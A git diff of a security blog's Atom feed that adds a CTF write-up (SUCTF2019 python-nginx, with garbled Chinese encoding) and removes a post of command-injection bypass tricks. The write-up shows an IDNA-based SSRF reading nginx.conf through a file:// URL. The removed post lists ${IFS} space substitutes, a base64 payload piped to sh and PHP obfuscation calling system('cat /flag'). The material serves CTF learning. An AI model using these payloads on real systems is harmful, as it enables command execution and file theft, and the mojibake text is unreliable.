@@ -6,7 +6,7 @@
   <link href="https://sakurahack-y.github.io/atom.xml" rel="self"/>
   
   <link href="https://sakurahack-y.github.io/"/>
-  <updated>2021-10-08T15:27:21.975Z</updated>
+  <updated>2021-10-09T17:03:46.196Z</updated>
   <id>https://sakurahack-y.github.io/</id>
   
   <author>
@@ -15,6 +15,35 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>SUCTF2019-python-nginx</title>
+    <link href="https://sakurahack-y.github.io/2021/10/10/SUCTF2019-python-nginx/"/>
+    <id>https://sakurahack-y.github.io/2021/10/10/SUCTF2019-python-nginx/</id>
+    <published>2021-10-09T16:26:18.000Z</published>
+    <updated>2021-10-09T17:03:46.196Z</updated>
+    
+    <content type="html"><![CDATA[<p>��ĿԴ�룺</p><pre><code>@app.route(&#39;/getUrl&#39;, methods = [&#39;GET&#39;, &#39;POST&#39;]) def getUrl():   url = request.args.get(&quot;url&quot;)   host = parse.urlparse(url).hostnameif host == &#39;suctf.cc&#39;:   return &quot;���� your problem? 111&quot;parts = list(urlsplit(url)) host = parts[1]if host == &#39;suctf.cc&#39;:   return &quot;���� your problem? 222 &quot; + host newhost = []for h in host.split(&#39;.&#39;):   newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))   parts[1] = &#39;.&#39;.join(newhost)  # ȥ�� url �еĿո�   finalUrl = urlunsplit(parts).split(&#39; &#39;)[0]   host = parse.urlparse(finalUrl).hostnameif host == &#39;suctf.cc&#39;:   return urllib.request.urlopen(finalUrl).read()else :  return &quot;���� your problem? 333&quot;</code></pre><h1 id="����һ"><a href="#����һ" class="headerlink" title="����һ"></a>����һ</h1><p>�������Ҫ��������</p><p>h.encode(‘idna’).decode(‘utf-8’)</p><p>IDNAʵ�����ǹ��ʻ�����</p><p>ʲô��IDN?</p><p>���ʻ�����(Internationalized Domain Name,IDN)���������ַ���������ָ���ֻ���ȫʹ���������ֻ���ĸ��ɵĻ������������������ġ��������������ϣ�������������ĸ�ȷ�Ӣ����ĸ����Щ���־������ֽ�����������ɡ�������ϵͳ�У����ʻ�����ʹ��punycodeתд����ASCII�ַ����洢��</p><p>?����ַ�,���ʹ��python3����idna����Ļ�<br><img src="5716b75ee313a7b46b03f9e81a0c281235eefcef.png" alt="5716b75ee313a7b46b03f9e81a0c281235eefcef"><br>Nginx��Ҫ�����ļ���</p><pre><code>�����ļ����Ŀ¼��/etc/nginx�������ļ���/etc/nginx/conf/nginx.conf�����ű���/usr/lib64/systemd/system/nginx.serviceģ�飺/usr/lisb64/nginx/modulesӦ�ó���/usr/sbin/nginx����Ĭ�ϴ��λ�ã�/usr/share/nginx/html��־Ĭ�ϴ��λ�ã�/var/log/nginx�����ļ�Ŀ¼Ϊ��/usr/local/nginx/conf/nginx.conf</code></pre><p>���ýű����ܿ����ַ���</p><pre><code class="#">for i in range(128,65537):        tmp=chr(i)        try:                res = tmp.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;)                if(&quot;-&quot;) in res:                        continue                print(&quot;U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; &quot;.format(tmp, res, i))        except:                pass</code></pre><p><img src="1a7b4518d0195e0f991788c2a30b071f6c667c06.png" alt="1a7b4518d0195e0f991788c2a30b071f6c667c06"><br>���ֿ������ַ���<br>���죺<img src="2551a2077a8e7cd35b3fae02754beeeee8e45352.png" alt="2551a2077a8e7cd35b3fae02754beeeee8e45352"><br><img src="b207d65aad991e8dab48a62ce5fb82fd290a84fe.png" alt="b207d65aad991e8dab48a62ce5fb82fd290a84fe"></p><h1 id="������"><a href="#������" class="headerlink" title="������"></a>������</h1><p>��������urlsplit©����<br>����ⲻ������Ϊsuctf.cc<br><img src="5870acef4e876503eed0436e9eebb67f85a0ed80.png" alt="5870acef4e876503eed0436e9eebb67f85a0ed80"><br>���Ǿ����� urlunsplit ���� suctf.cc�������׾͹������file////:suctf.cc/usr/local/nginx/conf/nginx.conf���������ܶ�ȡ�ļ��ˡ�</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;��ĿԴ�룺&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;@app.route(&amp;#39;/getUrl&amp;#39;, methods = [&amp;#39;GET&amp;#39;, &amp;#39;POST&amp;#39;]) 
+def getUrl(): 
+  url = request.args.get(&amp;</summary>
+      
+    
+    
+    
+    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
+    
+    <category term="ˢ��" scheme="https://sakurahack-y.github.io/categories/CTF/%CB%A2%EF%BF%BD%EF%BF%BD/"/>
+    
+    
+    <category term="ˢ��" scheme="https://sakurahack-y.github.io/tags/%CB%A2%EF%BF%BD%EF%BF%BD/"/>
+    
+  </entry>
   
   <entry>
     <title>一句话木马执行</title>
@@ -532,35 +561,6 @@ class A{
     
     
     <category term="小知识点" scheme="https://sakurahack-y.github.io/tags/%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>常见绕过方法</title>
-    <link href="https://sakurahack-y.github.io/2021/10/08/%E7%BB%95%E8%BF%87/"/>
-    <id>https://sakurahack-y.github.io/2021/10/08/%E7%BB%95%E8%BF%87/</id>
-    <published>2021-10-08T09:42:39.755Z</published>
-    <updated>2021-10-08T15:01:07.207Z</updated>
-    
-    <content type="html"><![CDATA[<p>空格替代:<br>    ${IFS}<br>    $IFS$9<br>    &lt;<br>    &lt;&gt;<br>    {,}</p><hr><p>sh</p><p>/?ip=127.0.0.1;echo$IFS$2Y2F0IGZsYWcucGhw|base64$IFS$2-d|sh</p><p>变量拼接：<br>/?ip=127.0.0.1;a=g;cat$IFS$2fla$a.php</p><p>内联注释(将反引号命令的结果作为输入来执行命令)<br>/?ip=127.0.0.1;cat$IFS$2<code>ls</code></p><p>查看命令补充<br>    cat     由第一行开始显示内容，并将所有内容输出<br>    tac     从最后一行倒序显示内容，并将所有内容输出<br>    more    根据窗口大小，一页一页的现实文件内容<br>    less    和more类似，但是是从后往前翻页并且，进行可以搜索字符<br>    head    只显示头几行<br>    tail    只显示最后几行<br>    nl      类似于cat -n，显示时输出行号</p><hr><p>进制绕过<br>php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数比如下面的代码会执行 system(‘ls’);</p><p>$a=’system’;<br>$a(‘ls’);</p><p>常用函数：base_convert(“1001”2,10)是将二进制的1001转换为10进制<br>dechex 10进制转成16进制<br>hex2bin  16进制转成字符串的函数<br>_GET</p><p><a href="http://4f07a754-92bf-4411-8bd8-a8da7ec1c514.node4.buuoj.cn:81/?c=$p=base_convert(37907361743,10,36)dechex(1598506324);$$p=%7B&#39;system&#39;};$$p">http://4f07a754-92bf-4411-8bd8-a8da7ec1c514.node4.buuoj.cn:81/?c=$p=base_convert(37907361743,10,36)dechex(1598506324);$$p={&#39;system&#39;};$$p</a>(cat /flag)<br>c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{pi}($$pi{abs})&amp;pi=system&amp;abs=cat /flag<br>$_GET{pi}($_GET{abs})  pi=system abs=cat /flag<br>本来是$_GET[]   –&gt;如果[]被过滤可以用$_GET{}</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;空格替代:&lt;br&gt;    ${IFS}&lt;br&gt;    $IFS$9&lt;br&gt;    &amp;lt;&lt;br&gt;    &amp;lt;&amp;gt;&lt;br&gt;    {,}&lt;/p&gt;
-&lt;hr&gt;
-&lt;p&gt;sh&lt;/p&gt;
-&lt;p&gt;/?ip=127.0.0.1;echo$IFS$2Y2F0IGZsYWcucGhw|</summary>
-      
-    
-    
-    
-    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
-    
-    <category term="绕过" scheme="https://sakurahack-y.github.io/categories/CTF/%E7%BB%95%E8%BF%87/"/>
-    
-    
-    <category term="绕过" scheme="https://sakurahack-y.github.io/tags/%E7%BB%95%E8%BF%87/"/>
     
   </entry>
   
